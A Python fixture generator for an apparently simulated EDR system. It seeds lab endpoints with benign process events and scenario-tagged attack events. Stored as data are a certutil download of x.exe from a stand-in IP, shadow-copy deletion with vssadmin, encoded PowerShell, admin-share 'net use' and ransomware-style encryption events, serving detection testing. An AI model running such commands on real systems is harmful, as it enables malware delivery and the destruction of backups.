from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta
import random

from apis.edr.db import EndpointModel, ProcessEventModel, NetworkEventModel, FileEventModel


@dataclass
class EndpointSpec:
    endpoint_id: str
    hostname: str
    os: str
    ip: str
    tags: list[str]
    scenario: str


ENDPOINT_SPECS = [
    EndpointSpec("ep-001", "ubuntu-lab-01", "linux", "10.11.3.42", ["ubuntu"], "normal"),
    EndpointSpec("ep-002", "kali-lab-02", "linux", "10.11.3.57", ["kali", "wazuh-agent"], "brute-force"),
    EndpointSpec("ep-003", "web-prod-03", "linux", "10.11.4.10", ["nginx"], "phishing-compromise"),
    EndpointSpec("ep-004", "win-dc-04", "windows", "10.11.5.20", ["windows", "domain-controller"], "credential-stuffing"),
    EndpointSpec("ep-005", "backup-05", "linux", "10.11.6.30", ["backup"], "ransomware-precursor"),
]

LINUX_BENIGN = [("cron", "/usr/sbin/cron -f"), ("sshd", "/usr/sbin/sshd -D"),
                ("systemd", "/sbin/init"), ("nginx", "nginx: worker process"),
                ("bash", "bash"), ("python3", "python3 -c 'import time'")]
WIN_BENIGN = [("svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs"),
              ("lsass.exe", "C:\\Windows\\System32\\lsass.exe"),
              ("explorer.exe", "C:\\Windows\\explorer.exe"),
              ("wmiprvse.exe", "C:\\Windows\\System32\\wbem\\wmiprvse.exe")]

SUSPICIOUS = {
    "brute-force": [("sshd", "/usr/sbin/sshd -R 10.11.3.57",
                     "repeated_ssh_handshake", 10)],
    "credential-stuffing": [("cmd.exe", "cmd.exe /c net use \\\\10.11.5.20\\C$ /user:admin *",
                             "suspicious_net_use", 15),
                            ("powershell.exe", "powershell.exe -c Invoke-WebRequest",
                             "script_invoke", 4)],
    "phishing-compromise": [("powershell.exe", "powershell -enc SQBFAFgA",
                             "encoded_powershell", 6),
                            ("cmd.exe", "cmd.exe /c certutil -urlcache -f http://198.51.100.9/x.exe",
                             "certutil_download", 3)],
    "ransomware-precursor": [("schtasks.exe", "schtasks.exe /create /tn updater /sc hourly",
                              "persistence_schtasks", 2),
                             ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet",
                              "vssadmin_shadow_delete", 1),
                             ("crypto.exe", "crypto.exe --encrypt /home/user/Documents",
                              "bulk_encryption", 20)],
}

BAD_IPS = {
    "brute-force": [("203.0.113.77", 22)],
    "phishing-compromise": [("198.51.100.9", 443)],
    "ransomware-precursor": [("192.0.2.15", 443), ("198.51.100.200", 443), ("203.0.113.31", 443)],
    "credential-stuffing": [("203.0.113.5", 445), ("203.0.113.6", 135)],
}


def generate_value(seed: int) -> dict:
    rng = random.Random(seed)
    endpoints: list[EndpointModel] = []
    processes: list[ProcessEventModel] = []
    networks: list[NetworkEventModel] = []
    files: list[FileEventModel] = []

    now = datetime.utcnow()
    for spec in ENDPOINT_SPECS:
        endpoints.append(EndpointModel(
            endpoint_id=spec.endpoint_id,
            hostname=spec.hostname,
            os=spec.os,
            ip=spec.ip,
            tags=",".join(spec.tags),
            scenario=spec.scenario,
        ))

        benign = LINUX_BENIGN if spec.os == "linux" else WIN_BENIGN
        total = 8 if spec.scenario == "normal" else 14
        for i in range(total):
            name, cmdline = benign[rng.randrange(len(benign))]
            processes.append(ProcessEventModel(
                endpoint_id=spec.endpoint_id,
                ts=now - timedelta(minutes=rng.randint(5, 1440)),
                pid=rng.randint(500, 9000),
                ppid=1,
                parent_name="systemd",
                name=name,
                cmdline=cmdline,
                user="root" if spec.os == "linux" else "NT AUTHORITY\\SYSTEM",
                integrity="high",
                suspicious=False,
            ))

        for name, cmdline, indicator, count in SUSPICIOUS.get(spec.scenario, []):
            for i in range(count):
                processes.append(ProcessEventModel(
                    endpoint_id=spec.endpoint_id,
                    ts=now - timedelta(minutes=rng.randint(1, 180)),
                    pid=rng.randint(1000, 9000),
                    ppid=1,
                    parent_name="systemd" if spec.os == "linux" else "wininit.exe",
                    name=name,
                    cmdline=cmdline,
                    user="root" if spec.os == "linux" else "NT AUTHORITY\\SYSTEM",
                    integrity="low",
                    suspicious=True,
                    indicator=indicator,
                ))

        for i in range(6):
            networks.append(NetworkEventModel(
                endpoint_id=spec.endpoint_id,
                ts=now - timedelta(minutes=rng.randint(2, 1400)),
                src_ip=spec.ip,
                dst_ip=f"10.11.0.{rng.randint(2, 254)}",
                dst_port=rng.choice([22, 80, 443, 53]),
                direction="outbound",
                proto="tcp",
            ))

        for dst, port in BAD_IPS.get(spec.scenario, []):
            networks.append(NetworkEventModel(
                endpoint_id=spec.endpoint_id,
                ts=now - timedelta(minutes=rng.randint(2, 240)),
                src_ip=spec.ip,
                dst_ip=dst,
                dst_port=port,
                direction="outbound",
                proto="tcp",
            ))

        if spec.scenario == "ransomware-precursor":
            for i in range(8):
                files.append(FileEventModel(
                    endpoint_id=spec.endpoint_id,
                    ts=now - timedelta(minutes=rng.randint(5, 120)),
                    path=f"/home/user/Documents/report-{i}.pdf.encrypted",
                    action="create",
                    hash=f"a1b2c3d4e5f6{i * 7 & 0xFFFF:04x}",
                ))
        elif spec.scenario == "phishing-compromise":
            files.append(FileEventModel(
                endpoint_id=spec.endpoint_id,
                ts=now - timedelta(minutes=30),
                path="C:\\Users\\Public\\x.exe",
                action="create",
                hash="deadbeef",
            ))

    return {
        "endpoints": endpoints,
        "processes": processes,
        "networks": networks,
        "files": files,
    }